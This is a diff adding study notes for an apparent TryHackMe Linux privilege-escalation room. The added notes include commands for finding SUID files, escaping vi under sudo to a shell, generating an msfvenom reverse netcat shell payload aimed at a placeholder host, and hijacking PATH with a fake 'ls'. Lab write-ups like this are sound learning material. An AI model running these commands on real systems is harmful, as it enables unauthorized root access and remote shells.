@@ -4,6 +4,8 @@ I've already done the first three rooms for this and didn't take notes. Better l
 
 ## Common Linux Privesc
 
+### Task 4 Enumeration
+
 2. What is the target's hostname?
 
 ```
@@ -33,3 +35,38 @@ cat /etc/crontab
 ls -la /etc/passwd
 ``` 
 Used hint.
+
+### Task 5 Abusing SUID/GUID Files
+
+1. What is the path of the file in user3's directory that stands out?
+```
+find / -perm -u=s -type f 2\>/dev/null
+```
+
+### Task 7 Exploiting Vi Editor
+```
+sudo -l
+```
+To see what we can run as sudo. If vi, `sudo vi` to open editor, then `:!sh` to spawn shell.
+
+### Task 8 Exploiting Crontab
+
+4. Create payload
+```
+msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+```
+
+### Task 9 Exploiting PATH Variable
+
+4. What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating?
+```
+echo "/bin/bash" > ls
+```
+
+5. Now we've made our imitation, we need to make it an executable. What command do we execute to do this?
+```
+chmod +x ls
+```
+
+6. Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command "export PATH=/tmp:$PATH"
+
